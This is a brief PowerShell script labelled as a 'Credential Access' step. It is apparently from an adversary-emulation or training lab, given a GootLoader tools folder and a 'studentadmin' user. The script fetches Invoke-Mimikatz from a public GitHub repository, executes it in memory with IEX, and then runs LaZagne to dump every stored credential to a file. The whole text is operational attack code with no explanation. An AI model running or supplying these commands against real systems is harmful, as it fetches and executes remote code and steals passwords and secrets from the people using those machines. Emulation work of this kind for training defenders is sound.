<#
STEP: Credential Access
#>

#Mimikatz
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1');

Invoke-Mimikatz

#LaZagne
cmd /c "cd C:\\Tools\\GootLoader && start lazagne.exe all -oN -output C:\\Users\\studentadmin\"